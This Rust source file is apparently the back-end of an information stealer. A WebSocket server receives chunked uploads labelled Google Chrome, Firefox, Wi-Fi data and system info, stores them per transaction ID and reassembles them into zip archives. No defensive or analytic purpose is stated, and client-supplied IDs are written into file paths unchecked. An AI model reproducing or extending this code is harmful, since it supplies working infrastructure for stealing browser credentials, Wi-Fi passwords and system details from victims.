extern crate websocket;
use std::io::{Write};
use std::path::PathBuf;
use std::{thread, fs};
use websocket::dataframe::Opcode;
use websocket::sync::Server;
use std::str;


pub struct ChunkDetail{
    chunk_id: u8,
    tx_id: [u8; 36],
    service: [u8; 256]
}

fn main(){
    const CHUNK_DETAIL_STRUCT_SIZE: usize = 293;

    let server = Server::bind("127.0.0.1:50001").unwrap();

    fs::create_dir_all("./data").unwrap();

    for connection in server.filter_map(Result::ok) {
        // Spawn a new thread for each connection.
        thread::spawn(move || {
              let mut client = connection.accept().unwrap();

              for dataframe in client.incoming_dataframes(){
                if dataframe.is_ok(){
                    let df = dataframe.unwrap();
                    if df.opcode == Opcode::Binary{
                        let start_detail_index = df.data.len() - CHUNK_DETAIL_STRUCT_SIZE;

                        let mut chunk_detail_bytes: [u8; CHUNK_DETAIL_STRUCT_SIZE] = [0; CHUNK_DETAIL_STRUCT_SIZE];

                        let mut i = start_detail_index;
                        let mut k = 0;

                        while i < df.data.len(){
                            chunk_detail_bytes[k] = df.data[i];

                            i += 1;
                            k += 1;
                        }


                        let chunk_detail: ChunkDetail = unsafe { std::ptr::read(chunk_detail_bytes.as_ptr() as *const _) };
                        let service_type = match str::from_utf8(&chunk_detail.service) {
                            Ok(v) => v,
                            Err(e) => "ERROR",
                        };
                        let tx_id = match str::from_utf8(&chunk_detail.tx_id) {
                            Ok(v) => v,
                            Err(e) => "ERROR",
                        };
                        let service_string = service_type.replace("\0", "");
                        let base_data_dir = format!("./data/{}", tx_id);
                        let chunk_data = df.data[0..start_detail_index].to_vec();
                      
                      
                        fs::create_dir_all(&base_data_dir).unwrap();

                        if service_string.eq("google_chrome"){
                            save_chunk(tx_id, &chunk_data, &start_detail_index, &chunk_detail, "google_chrome");
                        }else if service_string.eq("google_chrome_end"){
                            let base_tx_dir: String = format!("{}/{}", base_data_dir, "google_chrome");

                            join_chunks(&base_tx_dir, "google_chrome");
                        }else if service_string.eq("firefox"){
                            save_chunk(tx_id, &chunk_data, &start_detail_index, &chunk_detail, "firefox");
                        }else if service_string.eq("firefox_end"){
                            let base_tx_dir: String = format!("{}/{}", base_data_dir, "firefox");
                            join_chunks(&base_tx_dir, "firefox");
                        }else if service_string.eq("send_wifi_data"){
                            save_chunk(tx_id, &chunk_data, &start_detail_index, &chunk_detail, "wifi_data");
                        }else if service_string.eq("send_wifi_data_end"){
                            let base_tx_dir: String = format!("{}/{}", base_data_dir, "wifi_data");
                            join_chunks(&base_tx_dir, "wifi_data");
                        }else if service_string.eq("firefox"){

                        }else if service_string.eq("edge"){

                        }else if service_string.eq("send_system_info"){
                            let chunk_data = df.data[0..start_detail_index].to_vec();

                            let s = match str::from_utf8(chunk_data.as_slice()) {
                                Ok(v) => v,
                                Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
                            };
                            let output_json_filename = format!("{}/{}", base_data_dir, "system_info.json");

                            let output_json = json::parse(s).unwrap().pretty(4);
                            
                            println!("{}", output_json_filename);
                            let mut file = fs::OpenOptions::new()
                                .write(true)
                                .append(true)
                                .create(true)
                                .open(output_json_filename)
                                .unwrap();


                            let err = file.write(output_json.as_bytes());
                            if err.is_ok(){
                                err.unwrap();
                                println!("DATI SISTEM SALVATI CON SUCCESSO");
                            }
                        }

                    }else if df.opcode == Opcode::Text {
                        let string = df.data.to_vec();

                        let message = match str::from_utf8(&string) {
                            Ok(v) => v,
                            Err(e) => "ERROR",
                        };

                        println!("PACCHETTO DI ALTRO TIPO: {}", message);

                        if(message.eq("FINISH_GOOGLE_CHROME")){
                        }else if message.eq("ERROR"){

                        }else{

                        }
                    }
                }
            }
       });
    }
}

fn save_chunk(tx_id: &str, chunk_data: &Vec<u8>, start_detail_index: &usize, chunk_detail: &ChunkDetail, service: &str){
    let base_tx_dir: String = format!("./data/{}/{}", tx_id, service).replace("\0", "");
    fs::create_dir_all(&base_tx_dir).unwrap();
    let chunk_name = format!("{}/{}.chunk", base_tx_dir, chunk_detail.chunk_id);
    println!("{}", service);
    println!("RICEVENDO IL PACCHETTO: {}", chunk_detail.chunk_id);
    let err = fs::write(chunk_name, chunk_data).unwrap();    
}

fn join_chunks(base_tx_dir: &String, service: &str) {
    println!("AVVIO PROCEDURA FINALE GOOGLE CHROME");

    let files = fs::read_dir(base_tx_dir).unwrap();
    let mut array_file: Vec<PathBuf> = Vec::new();
    for file in files{

        if(file.is_ok()){
            //println!("{:?}", file);
            let f = file.unwrap();
        
            array_file.push(f.path());

            //file_final.write(&tmp).unwrap();
        }
    }
    array_file.sort_by(|a, b| a.partial_cmp(b).unwrap());
    let mut file_final = fs::OpenOptions::new()
    .write(true)
    .append(true)
    .create(true)
    .open(format!("{}/{}.zip", base_tx_dir, service))
    .unwrap();
    for chunk_path in array_file.into_iter(){
        let chunk_data = fs::read(&chunk_path).unwrap();
        file_final.write(&chunk_data).unwrap();

        fs::remove_file(&chunk_path).unwrap();
    }
}
